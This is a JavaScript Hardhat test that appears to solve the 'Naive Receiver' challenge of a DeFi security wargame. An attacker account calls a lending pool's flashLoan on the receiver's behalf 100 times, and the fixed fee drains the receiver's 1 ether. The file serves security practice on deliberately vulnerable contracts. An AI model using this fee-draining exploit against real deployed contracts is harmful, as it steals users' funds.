const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");


describe("Spent all the ether of reciever",function () {
    const  ETHER_IN_POOL = ethers.utils.parseEther('10');
    const ETHER_IN_RECEIVER = ethers.utils.parseEther('1');
    // This is in the NaiveReceiverLenderPool: FIXED_FEE = 0.01 ether
    // Attacker call the flashLoan function of the pool and lend money to the Reciever , everytime the receiver will pay the fixed_fee.For 100 times(1/0.01),the reciever's ether will all be spent.

    async function loadFixture() {
        [owner,attacker] = await ethers.getSigners();
        const poolFactory = await ethers.getContractFactory("NaiveReceiverLenderPool");
        const receiverFactory = await ethers.getContractFactory("FlashLoanReceiver");
        pool = await poolFactory.deploy();
        await pool.deployed();
        // receiver = await receiverFactory.deploy(pool.address,{value:ETHER_IN_RECEIVER});
        receiver = await receiverFactory.deploy(pool.address);
        await owner.sendTransaction({to:pool.address,value:ETHER_IN_POOL});
        await owner.sendTransaction({to:receiver.address,value:ETHER_IN_RECEIVER});
        await receiver.deployed();
        return [owner,attacker,pool,receiver];
    }
    it("Flash Loan to receiver for 100 times and the balance of reciever will be 0 ", async function () {
        const [owner,attacker,pool,receiver] = await loadFixture();
        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await ethers.provider.getBalance(receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
        //打印出pool的余额
        console.log("Before FlashLoan,pool balance:",await ethers.provider.getBalance(pool.address));
        console.log("Before FlashLoan,receiver balance:",await ethers.provider.getBalance(receiver.address));
       
        for (let i = 0; i < 100; i++) {
            await pool.connect(attacker).flashLoan(receiver.address,0);
        }
        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
        expect(await ethers.provider.getBalance(receiver.address)).to.be.equal(0);
        console.log("After FlashLoan,pool balance:",await ethers.provider.getBalance(pool.address));
        console.log("After FlashLoan,receiver balance:",await ethers.provider.getBalance(receiver.address));

    });
    
})